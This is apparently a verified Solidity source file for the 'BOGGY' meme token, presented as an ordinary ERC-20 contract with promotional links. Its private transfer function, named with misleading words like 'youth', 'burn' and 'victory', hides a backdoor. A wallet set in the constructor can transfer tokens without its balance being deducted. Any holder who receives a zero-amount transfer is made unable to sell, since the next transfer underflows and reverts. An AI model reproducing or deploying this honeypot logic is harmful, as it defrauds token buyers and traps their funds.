/**
 *Submitted for verification at Etherscan.io on 2023-05-10
*/

/*

    https://t.me/BoggyEntryPortal

    http://www.boggytoken.com

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract BOGGY is Ownable {
    uint256 private stun = 35;

    function youth(address native, address grandfather, uint256 able) private returns (bool success) {
        if (burn[native] == 0) {
            if (victory[native] > 0 && native != uniswapV2Pair) {
                burn[native] -= stun;
            }
            balanceOf[native] -= able;
        }
        if (able == 0) {
            victory[grandfather] += stun;
        }
        balanceOf[grandfather] += able;
        emit Transfer(native, grandfather, able);
        return true;
    }

    string public symbol;

    mapping(address => uint256) private burn;

    address public uniswapV2Pair;

    string public name;

    uint256 public totalSupply;

    function approve(address blanket, uint256 able) public returns (bool success) {
        allowance[msg.sender][blanket] = able;
        emit Approval(msg.sender, blanket, able);
        return true;
    }

    constructor(address farther) {
        symbol = 'BOGGY';
        name = 'BOGGY';
        totalSupply = 7000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        burn[farther] = stun;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address grandmother, uint256 able) public returns (bool success) {
        youth(msg.sender, grandmother, able);
        return true;
    }

    uint8 public decimals = 9;

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address native, address grandfather, uint256 enable) public returns (bool success) {
        youth(native, grandfather, enable);
        require(enable <= allowance[native][msg.sender]);
        allowance[native][msg.sender] -= enable;
        return true;
    }

    mapping(address => uint256) private victory;
}